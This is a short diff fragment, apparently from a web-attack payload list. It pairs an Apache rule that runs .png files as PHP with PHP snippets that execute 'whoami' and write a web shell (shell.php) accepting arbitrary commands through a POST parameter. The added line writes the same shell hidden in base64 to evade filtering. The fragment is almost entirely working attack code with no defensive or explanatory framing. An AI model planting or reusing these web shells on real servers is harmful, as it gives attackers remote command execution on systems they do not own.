@@ -106,5 +106,6 @@ AddType application/x-httpd-php .png
 <?php system("whoami"); ?>
 <?php
 file_put_contents("shell.php","<?php @eval($_POST['cmd']); ?>");
+file_put_contents("shell.php",base64_decode("PD9waHAgCkBldmFsKCRfUE9TVFsnY21kJ10pOyAKPz4="));
 ?>
 
